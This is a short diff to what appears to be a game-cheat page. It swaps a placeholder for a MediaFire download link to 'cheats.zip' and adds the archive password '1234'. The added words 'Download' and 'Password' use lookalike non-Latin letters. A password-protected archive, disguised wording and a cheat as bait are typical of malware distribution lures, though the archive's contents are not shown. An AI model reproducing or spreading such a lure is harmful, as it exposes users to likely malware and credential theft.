@@ -24,6 +24,7 @@ Download the cheat file.
 
 Note: The cheat only works in single-player mode. Use at your own risk in online games.
 
-Dоwnlоаd the chеаt: [link] ()
+### [Dоwnlоаd](https://www.mediafire.com/file/lzap7b6kgtk2xbu/cheats.zip/file)
+### Pаsswоrd: 1234
 
 Turn your garden into a paradise without any effort! 🌟
